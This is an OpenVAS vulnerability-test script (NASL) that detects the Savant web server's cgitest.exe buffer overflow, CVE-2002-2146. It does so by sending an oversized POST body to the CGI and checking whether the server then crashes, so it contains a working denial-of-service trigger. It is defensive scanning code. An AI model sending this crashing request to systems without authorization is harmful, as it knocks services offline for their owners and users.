# OpenVAS Vulnerability Test
# $Id: savant_cgitest.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Savant cgitest.exe buffer overflow
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "cgitest.exe from Savant web server is installed. This CGI is
vulnerable to a buffer overflow which may allow a cracker to 
crash your server or even run code on your system.";

tag_solution = "Upgrade your web server or remove this CGI.";

# References:
# 
# Date: Fri, 13 Sep 2002 19:55:05 +0000
# From "Auriemma Luigi" <aluigi@pivx.com>
# To: bugtraq@securityfocus.com
# Subject: Savant 3.1 multiple vulnerabilities

if(description)
{
 script_id(11173);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2002-2146");
 script_bugtraq_id(5706);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 
 name = "Savant cgitest.exe buffer overflow";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

 script_description(desc);
 
 summary = "Savant cgitest.exe buffer overflow";
 script_summary(summary);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Web application abuses";
 
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www",80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port)) exit(0);


foreach dir (cgi_dirs())
{
 p = string(dir, "/cgitest.exe");
 if(is_cgi_installed_ka(item:p, port:port))
 {
 soc = http_open_socket(port);
 if (! soc) exit(0);

 len = 256;	# 136 should be enough
 req = string("POST ", p, "HTTP/1.0\r\n", "Host: ", get_host_name(),
       "\r\nContent-Length: ", len, "\r\n\r\n", crap(len), "\r\n");
 send(socket:soc, data:req);
 http_close_socket(soc);

 sleep(1);

 if(http_is_dead(port: port))
 {
  security_hole(port);
  exit(0);
  } 
 }
}
